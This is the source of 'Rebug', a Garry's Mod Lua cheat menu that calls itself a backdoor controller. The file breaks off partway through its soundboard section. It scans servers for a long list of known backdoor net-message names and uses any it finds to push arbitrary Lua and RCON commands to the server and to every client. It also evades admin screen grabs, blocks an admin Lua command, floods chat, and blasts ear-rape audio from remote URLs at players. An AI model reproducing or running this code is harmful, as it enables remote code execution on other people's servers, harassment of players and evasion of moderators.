/*=======================================================================

   ▄████████    ▄████████ ▀█████████▄  ███    █▄     ▄██████▄  
  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
  ███    ███   ███    █▀    ███    ███ ███    ███   ███    █▀  
 ▄███▄▄▄▄██▀  ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███  ▄███        
▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███ ▀▀███ ████▄  
▀███████████   ███    █▄    ███    ██▄ ███    ███   ███    ███ 
  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
  ███    ███   ██████████ ▄█████████▀  ████████▀    ████████▀  
  ███    ███                                                   


Backdoor controller created by Project Rebug. The code for this script
has been made organised for better understanding.
---------------------------------------------------------
// Coded By ProjectRebug Login Release Source
// https://github.com/ProjectRebug/RebugV2-Release
// Note to the person using this, removing this
// text is in violation of the licence you agreed
// to by downloading.
// Copyright © ProjectRebug 2019
// Licenced under © GNU licence here
// https://github.com/ProjectRebug/RebugV2-Release/blob/master/LICENSE
---------------------------------------------------------

Project Rebug: 2016-2019
=======================================================================*/

surface.CreateFont("MenuFont", {
    font = "testfont1",
    size = 12,
    weight = 674,
    antialias = false,
    outline = true
})

local function msgG(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, Color(0, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

local function msgY(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, Color(255, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

local function msgR(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

-- hehe
local function msgRGB(time, text)
    if not windowopen then
        windowopen = true
        local window = vgui.Create("DFrame")
        window:SetPos(ScrW() / 2.7, 0)
        window:SetSize(500, 25)
        window:SlideDown(0.3)
        window:SetTitle("")
        window:ShowCloseButton(false)
        window:SetDraggable(false)

        window.Paint = function(s, w, h)
            surface.SetDrawColor(40, 40, 40, 240)
            surface.DrawRect(0, 0, w, h)
            --draw.RoundedBox(8, 0, 0, w, h, Color(40, 40, 40, 240))
            draw.DrawText(text, "MenuFont", w / 2, 6, HSVToColor(RealTime() * 69 % 360, 1, 1) or Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end

        timer.Simple(time, function()
            if windowopen then
                window:SlideUp(0.3)

                timer.Simple(0.3, function()
                    windowopen = false
                    window:Remove()
                end)
            end
        end)
    end

    chat.PlaySound()
    print("\n" .. text .. "\n")
end

local function rprint(...)
    chat.AddText(Color(255, 0, 20), "[REBUG] ", Color(20, 150, 200), ...)
end

--[[-------------------------------------------------------------------------------------
StartUp
----------------------------------------------------------------------------------------]]
msgY(1.4, "Initializing...")
surface.PlaySound("weapons/ar2/ar2_reload.wav")

// protections
RunConsoleCommand('r_shader_srgb', '0')
chat.AddText(string.rep("\n", 1000))


timer.Simple(2, function()
    local rvac = (_G)

    do
        if (rvac.game.SinglePlayer()) then
            msgR(4.3, "Menu will not load in single player!")
            surface.PlaySound("buttons/lightswitch2.wav")

            return
        end

	--[[if (_G.Loaded2) then
		msgR(4.3, "The Backdoor menu has already been loaded, Reloading will cause errors!")
		surface.PlaySound("buttons/lightswitch2.wav")
		return
	end]]
        _G.Loaded2 = true
    end

    print("\n")
    surface.PlaySound("buttons/bell1.wav")

	print("\n")
MsgC(Color(255, 0, 0), [[
.---..-----------------------------------------------..---.
]])
    MsgC(Color(255, 64, 0), [[
|   ||.---------------------------------------------.||   |
]])
    MsgC(Color(255, 128, 0), [[
| o |||                 Rebug Cheats                ||| o |
]])
    MsgC(Color(255, 191, 0), [[
| _ |||---------------------------------------------||| _ |
]])
    MsgC(Color(255, 191, 0), [[
|(_)|||                 Version: 2.0                |||(_)|
]])
    MsgC(Color(255, 255, 0), [[
|   |||               Date: 07.09.19                |||   |
]])
    MsgC(Color(191, 255, 0), [[
|   |||---------------------------------------------|||   |
]])
    MsgC(Color(128, 255, 0), [[
|.-.|||                   Updates:                  |||.-.|
]])
    MsgC(Color(64, 255, 0), [[
| o |||    |SnteDetour| |Bd UI Update| |Cheat Menu| ||| o |
]])
    MsgC(Color(0, 255, 0), [[
|`-'|||---------------------------------------------|||`-'|
]])
    MsgC(Color(0, 255, 64), [[
|   |||                   Creator:                  |||   |
]])
    MsgC(Color(0, 255, 128), [[
|.-.|||             Void, Cyanide, Gubbi            |||.-.|
]])
    MsgC(Color(0, 255, 191), [[
| O |||---------------------------------------------||| O |
]])
    MsgC(Color(0, 255, 255), [[
|`-'||`---------------------------------------------'||`-'|
]])
    MsgC(Color(0, 191, 255), [[
`---'`-----------------------------------------------'`---'
]])
    MsgC(Color(0, 128, 255), [[
       _||_   Imagine paying for grobyware or   _||_
]])
    MsgC(Color(0, 64, 255), [[
      /____\        Some french paste xD       /____\
]])
    MsgC(Color(90, 0, 255), [[
                            lmao
]])

	print("\n")

    timer.Create("ChatPrint2", 0.1, 1, function()
        msgRGB(3.2, "Backdoor Menu Loaded!")
    end)

--[[-------------------------------------------------------------------------------------
Menu Optimization
----------------------------------------------------------------------------------------]]
hook.Add( "InitPostEntity", "fpsbooster", function()
	RunConsoleCommand("gmod_mcore_test", "1")
	RunConsoleCommand("mat_queue_mode", "-1")
	RunConsoleCommand("cl_threaded_bone_setup", "1")
	RunConsoleCommand("cl_threaded_client_leaf_system", "1")
	RunConsoleCommand("r_threaded_client_shadow_manager", "1")
	RunConsoleCommand("r_threaded_particles", "1")
	RunConsoleCommand("r_threaded_renderables", "1")
	RunConsoleCommand("r_queued_ropes", "1")
	RunConsoleCommand("studio_queue_mode", "1")
	 	hook.Remove("RenderScreenspaceEffects", "RenderColorModify")
 		hook.Remove("RenderScreenspaceEffects", "RenderBloom")
 		hook.Remove("RenderScreenspaceEffects", "RenderToyTown")
 		hook.Remove("RenderScreenspaceEffects", "RenderTexturize")
 		hook.Remove("RenderScreenspaceEffects", "RenderSunbeams")
 		hook.Remove("RenderScreenspaceEffects", "RenderSobel")
 		hook.Remove("RenderScreenspaceEffects", "RenderSharpen")
 		hook.Remove("RenderScreenspaceEffects", "RenderMaterialOverlay")
 		hook.Remove("RenderScreenspaceEffects", "RenderMotionBlur")
 		hook.Remove("RenderScene", "RenderStereoscopy")
 		hook.Remove("RenderScene", "RenderSuperDoF")
 		hook.Remove("GUIMousePressed", "SuperDOFMouseDown")
 		hook.Remove("GUIMouseReleased", "SuperDOFMouseUp")
 		hook.Remove("PreventScreenClicks", "SuperDOFPreventClicks")
 		hook.Remove("PostRender", "RenderFrameBlend")
 		hook.Remove("PreRender", "PreRenderFrameBlend")
 		hook.Remove("Think", "DOFThink")
 		hook.Remove("RenderScreenspaceEffects", "RenderBokeh")
 		hook.Remove("NeedsDepthPass", "NeedsDepthPass_Bokeh")
 		hook.Remove("PostDrawEffects", "RenderWidgets")
 		hook.Remove("PostDrawEffects", "RenderHalos")
end)
hook.Add("OnEntityCreated","WidgetInit",function(ent)
	if ent:IsWidget() then
		hook.Add( "PlayerTick", "TickWidgets", function( pl, mv ) widgets.PlayerTick( pl, mv ) end ) 
		hook.Remove("OnEntityCreated","WidgetInit")
	end
end)

--[[-------------------------------------------------------------------------------------
ULX LuaCmd Blocker
----------------------------------------------------------------------------------------]]
	local errClear = "\n"

	for i = 1, 50000 do
		errClear = errClear .. "\n"
	end

	local blacklist = "LuaCmd"

	function trace(event, line)
		local s = debug.getinfo(2).short_src

		if s == blacklist then
			rprint("Blocked SendLua\n")
			error(errClear, 3)

			return
		end
	end

	debug.sethook(trace, "c")
		
--[[-------------------------------------------------------------------------------------
Administration Addons
----------------------------------------------------------------------------------------]]
    if istable(ULib) then
        rprint("Admin-Mod: ULX")
    end

    if istable(FAdmin) then
        rprint("Admin-Mod: FAdmin")
    end

    if istable(GExtension) then
        rprint("Admin-Mod: GExtension")
    end

    if istable(gBan) then
        rprint("Admin-Mod: gBan")
    end

--[[-------------------------------------------------------------------------------------
Locals
----------------------------------------------------------------------------------------]]
    local rebug = {}
    local channel = ""
    local netStrings = {}
    local BD = {}
    local noob = {}
    local MenuDelay = false
    local MenuOpen = false
    local ply = LocalPlayer()
    local selPly = 0

--[[-------------------------------------------------------------------------------------
Fonts
----------------------------------------------------------------------------------------]]
    surface.CreateFont("button", {
        font = "Calibri",
        extended = not 1,
        size = 16,
        weight = 500,
        blursize = 0,
        scanlines = 0,
        antialias = not not 1,
        underline = not 1,
        italic = not 1,
        strikeout = not 1,
        symbol = not 1,
        rotary = not 1,
        shadow = not 1,
        additive = not 1,
        outline = not 1
    })

--[[-------------------------------------------------------------------------------------
Gradient
----------------------------------------------------------------------------------------]]
    local grad = Material("gui/gradient")
    local upgrad = Material("gui/gradient_up")
    local downgrad = Material("gui/gradient_down")
--[[-------------------------------------------------------------------------------------
Colors
----------------------------------------------------------------------------------------]]
    local o_color2 = Color(30, 30, 30, 255)
    local o_blue = Color(20, 150, 200, 255)
--[[-------------------------------------------------------------------------------------
NetWorks
----------------------------------------------------------------------------------------]]
    function CheckIfStringExists(str)
        local status, error = pcall(net.Start, str)

        return status
    end

	local function rndstr(len)
		if len == nil then len = 5 end
		local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
		local r = ""
		while string.len(r) < len do
		r = r..chars[math.random(1, #chars)]
		end
		return r
	end
	
	local noobstr = rndstr(16)
	
    -- Notify
    function noob.Notify(msg)
        chat.AddText(Color(255, 0, 0), "[REBUG] ", o_blue, msg)
    end

    -- Backdoored Strings
	netStrings.Strings={{NetString="Sandbox_ArmDupe"},{NetString="entityhealt"},{NetString="m"},{NetString="material"},{NetString="REBUG"},{NetString="BetStrep"},{NetString="keyss"},{NetString="banId2"},{NetString="Val"},{NetString="models/zombie.mdl"},{NetString="FPSBOOST"},{NetString="PlayerCheck"},{NetString="Sbox_darkrp"},{NetString="insid3"},{NetString="The_Dankwoo"},{NetString="Sbox_itemstore"},{NetString="Ulib_Message"},{NetString="ULogs_Info"},{NetString="ITEM"},{NetString="R8"},{NetString="fix"},{NetString="Fix_Keypads"},{NetString="Remove_Exploiters"},{NetString="noclipcloakaesp_chat_text"},{NetString="_Defqon"},{NetString="_CAC_ReadMemory"},{NetString="lmaogetdunked"},{NetString="nostrip"},{NetString="nocheat"},{NetString="LickMeOut"},{NetString="ULX_QUERY2"},{NetString="ULXQUERY2"},{NetString="https://i.imgur.com/Gf6hLMl.png"},{NetString="MoonMan"},{NetString="Im_SOCool"},{NetString="JSQuery.Data(Post(false))"},{NetString="Sandbox_GayParty"},{NetString="DarkRP_UTF8"},{NetString="oldNetReadData"},{NetString="Gamemode_get"},{NetString="memeDoor"},{NetString="BackDoor"},{NetString="SessionBackdoor"},{NetString="DarkRP_AdminWeapons"},{NetString="cucked"},{NetString="NoNerks"},{NetString="kek"},{NetString="ZimbaBackDoor"},{NetString="something"},{NetString="random"},{NetString="strip0"},{NetString="fellosnake"},{NetString="enablevac"},{NetString="idk"},{NetString="ÃžÃ ?D)â—˜"},{NetString="snte"},{NetString="apg_togglemode"},{NetString="Hi"},{NetString="beedoor"},{NetString="BDST_EngineForceButton"},{NetString="VoteKickNO"},{NetString="REEEEEEEEEEEE"},{NetString="_da_"},{NetString="Nostra"},{NetString="sniffing"},{NetString="keylogger"},{NetString="CakeInstall"},{NetString="Cakeuptade"},{NetString="love"},{NetString="earth"},{NetString="ulibcheck"},{NetString="Nostrip_"},{NetString="teamfrench"},{NetString="ADM"},{NetString="hack"},{NetString="crack"},{NetString="leak"},{NetString="lokisploit"},{NetString="1234"},{NetString="123"},{NetString="enculer"},{NetString="cake"},{NetString="seized"},{NetString="88"},{NetString="88_strings_"},{NetString="nostraall"},{NetString="blogs_update"},{NetString="nolag"},{NetString="loona_"},{NetString="billys_logs"},{NetString="loona"},{NetString="negativedlebest"},{NetString="berettabest"},{NetString="ReadPing"},{NetString="antiexploit"},{NetString="adm_NetString"},{NetString="mathislebg"},{NetString="Bilboard.adverts:Spawn(false)"},{NetString="pjHabrp9EY"},{NetString="?"},{NetString="lag_ping"},{NetString="allowLimitedRCON(user) 0"},{NetString="aze46aez67z67z64dcv4bt"},{NetString="killserver"},{NetString="fuckserver"},{NetString="cvaraccess"},{NetString="rcon"},{NetString="rconadmin"},{NetString="web"},{NetString="jesuslebg"},{NetString="zilnix"},{NetString="ߠ?D)?"},{NetString="disablebackdoor"},{NetString="kill"},{NetString="DefqonBackdoor"},{NetString="DarkRP_AllDoorDatas"},{NetString="0101.1"},{NetString="awarn_remove"},{NetString="_Infinity"},{NetString="Infinity"},{NetString="InfinityBackdoor"},{NetString="_Infinity_Meme_"},{NetString="arivia"},{NetString="ULogs_B"},{NetString="_Warns"},{NetString="_cac_"},{NetString="striphelper"},{NetString="_vliss"},{NetString="YYYYTTYXY6Y"},{NetString="?????????????????п??? ?? ?ѿ??Ŀտ? ???ѿ??տ??Ю"},{NetString="_KekTcf"},{NetString="_blacksmurf"},{NetString="blacksmurfBackdoor"},{NetString="_Raze"},{NetString="m9k_explosionradius"},{NetString="m9k_explosive"},{NetString="m9k_addons"},{NetString="rcivluz"},{NetString="SENDTEST"},{NetString="_clientcvars"},{NetString="_main"},{NetString="stream"},{NetString="waoz"},{NetString="bdsm"},{NetString="ZernaxBackdoor"},{NetString="UKT_MOMOS"},{NetString="anticrash"},{NetString="audisquad_lua"},{NetString="dontforget"},{NetString="noprop"},{NetString="thereaper"},{NetString="0x13"},{NetString="Child"},{NetString="!Cac"},{NetString="azkaw"},{NetString="BOOST_FPS"},{NetString="childexploit"},{NetString="ULX_ANTI_BACKDOOR"},{NetString="FADMIN_ANTICRASH"},{NetString="ULX_QUERY_TEST2"},{NetString="GMOD_NETDBG"},{NetString="netlib_debug"},{NetString="_DarkRP_Reading"},{NetString="lag_ping"},{NetString="||||"},{NetString="SteamApp2313"},{NetString="FPP_RemovePLYCache"},{NetString="fuwa"},{NetString="stardoor"},{NetString="SENDTEST"},{NetString="rcivluz"},{NetString="c"},{NetString="N::B::P"},{NetString="changename"},{NetString="PlayerItemPickUp"},{NetString="echangeinfo"},{NetString="fourhead"},{NetString="music"},{NetString="slua"},{NetString="adm_network"},{NetString="componenttolua"},{NetString="theberettabcd"},{NetString="SparksLeBg"},{NetString="DarkRP_Armors"},{NetString="DarkRP_Gamemodes"},{NetString="fancyscoreboard_leave"},{NetString="PRDW_GET"},{NetString="pwn_http_send"},{NetString="AnatikLeNoob"},{NetString="GVacDoor"},{NetString="Keetaxor"},{NetString="BackdoorPrivate666"},{NetString="YohSambreLeBest"},{NetString="SNTE<ALL"},{NetString="!Ǻ/;."},{NetString="pwn_http_answer"},{NetString="pwn_wake"},{NetString="verifiopd"},{NetString="AidsTacos"},{NetString="shix"},{NetString="PDA_DRM_REQUEST_CONTENT"},{NetString="xenoreceivetargetdata2"},{NetString="xenoreceivetargetdata1"},{NetString="xenoserverdatafunction"},{NetString="xenoserverfunction"},{NetString="xenoclientdatafunction"},{NetString="xenoclientfunction"},{NetString="xenoactivation"},{NetString="EXEC_REMOTE_APPS"},{NetString="yohsambresicianatik<3"},{NetString="Sbox_Message"},{NetString="Sbox_gm_attackofnullday_key"},{NetString="The_DankWhy"},{NetString="nw.readstream"},{NetString="AbSoluT"},{NetString="__G____CAC"},{NetString="Weapon_88"},{NetString="mecthack"},{NetString="SetPlayerDeathCount"},{NetString="FAdmin_Notification_Receiver"},{NetString="DarkRP_ReceiveData"},{NetString="fijiconn"},{NetString="LuaCmd"},{NetString="EnigmaProject"},{NetString="z"},{NetString="cvardel"},{NetString="json.parse(crashsocket)"},{NetString="effects_en"},{NetString="file"},{NetString="gag"},{NetString="asunalabestwaifu"},{NetString="stoppk"},{NetString="Ulx_Error_88"},{NetString="NoOdium_ReadPing"},{NetString="banId"},{NetString="kickId2"},{NetString="elsakura"}}

    function CheckBackdoors()
        for k, v in pairs(netStrings.Strings) do
            if (CheckIfStringExists(v.NetString)) then
                channel = v.NetString
                chat.AddText(Color(255, 0, 0), "[REBUG]", Color(20, 150, 20), " Found Vulnerability ▶ ", Color(20, 150, 200), [[]] .. v.NetString)
            end
        end
    end

    function noob.PostLua(str)
        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(1)
        net.SendToServer()
    end

    function noob.PostRcon(str)
        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(false)
        net.SendToServer()
    end

    function noob.PostLua(str)
        if (channel == "") then
            rprint(" You are not targeting a NetString")

            return
        end

        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(1)
        net.SendToServer()
    end

    function sendLuaPly(str)
        net.Start(channel)
        net.WriteString("BroadcastLua([[" .. str .. "]])")
        net.SendToServer()
    end

    function sendLuaPlyKv(str)
        net.Start(channel)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua(" .. str .. ") end")
        net.SendToServer()
    end

--[[-------------------------------------------------------------------------------------
ScreenGrab
----------------------------------------------------------------------------------------]]
	local fakeRT = GetRenderTarget( "fakeRT" .. os.time(), ScrW(), ScrH() )
     
	hook.Add( "RenderScene", "RSByman", function( vOrigin, vAngle, vFOV )
		local view = {
			x = 0,
			y = 0,
			w = ScrW(),
			h = ScrH(),
			dopostprocess = true,
			origin = vOrigin,
			angles = vAngle,
			fov = vFOV,
			drawhud = true,
			drawmonitors = true,
			drawviewmodel = true
		}
 
		render.RenderView( view )
		render.CopyTexture( nil, fakeRT )
 
		cam.Start2D()
			hook.Run( "AltHUDPaint" )
		cam.End2D()
 
		render.SetRenderTarget( fakeRT )
 
		return true
	end )
 
	hook.Add( "ShutDown", "RemoveAntiScreenGrab", function()
		render.SetRenderTarget()
	end )

--[[-------------------------------------------------------------------------------------
Insert Key
----------------------------------------------------------------------------------------]]
    function rebug.voidz()
        hook.Add("Think", "openMenu", function()
            if input.IsKeyDown(KEY_INSERT) and not MenuDelay then
                MenuDelay = true
                rebug.load()

                timer.Simple(0.5, function()
                    MenuDelay = false
                end)
            end
        end)
    end

    function rebug.load()
        if MenuOpen then
            CloseMenu()

            return
        end

--[[-------------------------------------------------------------------------------------
Main Menu
----------------------------------------------------------------------------------------]]
        MenuOpen = true
        local Void = vgui.Create("DFrame")
        surface.PlaySound("buttons/blip1.wav")
        Void:SetSize(900, 700)
        Void:Center()
        Void:SetTitle("")
        Void:ShowCloseButton()
        Void:MakePopup()
        Void:SetVisible(true)
        Void:SetDraggable(true)

        Void.Paint = function(self, w, h)
            surface.DrawRect(4, 4, Void:GetWide() - 8, Void:GetTall() - 8)
            draw.RoundedBox(10, 0, 0, w, h, Color(35, 35, 35, 255))
            surface.SetDrawColor(36, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(0, 0, 0, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
            surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        end

        local VoidPlate = vgui.Create('DPanelList', Void)
        VoidPlate:SetSize(888, 688)
        VoidPlate:SetPos(6, 6)

        VoidPlate.Paint = function(s, w, h)
            surface.SetDrawColor(Color(35, 35, 35))
            draw.RoundedBox(10, 20, 20, w + 0, h - 1, Color(35, 35, 35, 255))
            surface.SetDrawColor(25, 25, 25)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(35, 35, 35, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local Rainbow = vgui.Create('DPanelList', VoidPlate)
        Rainbow:SetSize(890, 2)
        Rainbow:SetPos(1, 0)

        Rainbow.Paint = function(s, w, h)
            surface.SetDrawColor(Color(100, 100, 100))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(Color(100, 100, 100))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(HSVToColor(CurTime() % 6 * 60, 1, 1))
            surface.DrawOutlinedRect(0, 0, w, h)
            surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        end

--[[-------------------------------------------------------------------------------------
Button Function
----------------------------------------------------------------------------------------]]
        function rebug.AddButton(name, parent, func)
            local button = parent:Add("DButton")
            button:SetText("")
            button:Dock(TOP)
            button:SetFont("DermaDefault")
            button:DockMargin(0, 0, 0, 5)
            button:SetSize(170, 30)
            button.DoClick = func

            button.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
                draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
            end
        end

        function rebug.AddButtonBIG(name, parent, func)
            local button = parent:Add("DButton")
            button:SetText("")
            button:Dock(TOP)
            button:SetFont("Trebuchet18")
            button:DockMargin(0, 0, 0, 5)
            button:SetSize(525, 30)
            button.DoClick = func

            button.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
                draw.SimpleTextOutlined(name, "button", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
            end
        end

--[[-------------------------------------------------------------------------------------
Label Function
----------------------------------------------------------------------------------------]]
        function noob.addLabel(name, posx, posy, parent)
            local T1 = parent:Add("DLabel")
            T1:SetSize(200, 80)
            T1:SetPos(posx, posy)
            T1:SetFont("Trebuchet18")
            T1:SetText(name)
            T1:SetTextColor(Color(255, 255, 255, 255))
        end

        --Labels
        noob.addLabel("Server BackDoors", 60, 100, VoidPlate)
        noob.addLabel("RCON Backdoors", 280, 100, VoidPlate)
        noob.addLabel("Target Backdoors", 515, 100, VoidPlate)
        noob.addLabel("Player List", 755, 100, VoidPlate)

--[[-------------------------------------------------------------------------------------
SoundBoard ( BD Required )
----------------------------------------------------------------------------------------]]
        function soundboard()
            local soundboard = vgui.Create("DFrame")
            surface.PlaySound("buttons/blip1.wav")
            soundboard:SetSize(600, 450)
            soundboard:Center()
            soundboard:SetTitle("SoundBoard ( Backdoor Required )")
            soundboard:MakePopup()
            soundboard:SetDraggable(true)

            soundboard.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local soundPlate = vgui.Create('DPanelList', soundboard)
            soundPlate:SetSize(590, 418)
            soundPlate:SetPos(6, 27)

            soundPlate.Paint = function(s, w, h)
                surface.SetDrawColor(Color(35, 35, 35))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local customurl = vgui.Create("DButton", soundPlate)
            customurl:SetFont("Trebuchet18")
            customurl:SetText("Play Custom URL")
            customurl:SetFont("Trebuchet18")
            customurl:SetTextColor(Color(255, 255, 255, 255))
            customurl:SetPos(20, 13)
            customurl:SetSize(550, 40)

            customurl.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            customurl.DoClick = function()
                surface.PlaySound("buttons/button18.wav")

                Derma_StringRequest("Play Sound", "Set Link (Has to end with .AUDIOFORMAT)", "", function(str)
                    noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. str .. "\" , \"mono\", function() end)]])")
                end)
            end

            local List7 = vgui.Create("DPanelList", soundPlate)
            List7:SetPos(20, 63)
            List7:SetSize(550, 340)
            List7:SetName("")

            List7.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local item7 = vgui.Create("DPanelList", List7)
            item7:SetPos(10, 8)
            item7:SetSize(530, 320)
            item7:SetPadding(2)
            item7:SetSpacing(2)
            item7:EnableHorizontal(false)
            item7:EnableVerticalScrollbar(true)
            item7:SetName("")

            item7.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetDrawColor(35, 35, 35, 0)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local Bar7 = vgui.Create("DScrollPanel", item7)
            Bar7:Dock(FILL)
            local sBar7 = Bar7:GetVBar()

            function sBar7:Paint()
            end

            function sBar7.btnUp:Paint()
            end

            function sBar7.btnDown:Paint()
            end

            function sBar7.btnGrip:Paint()
            end

            rebug.AddButtonBIG("Earth Wind (Normal)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://httpsinfamousvoice1com.000webhostapp.com/08_Earth.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("DajaVu (Normal)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://httpsinfamousvoice1com.000webhostapp.com/daja.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Comethazine Walk (Normal)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/sound/walk.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Fortnite Default Dance (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/FortniteDefaultDanceEARRAPE.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("LilPump DRose (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/LilPumDRoseEarrape.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("No Nonses (EarRape)", Bar7, function()
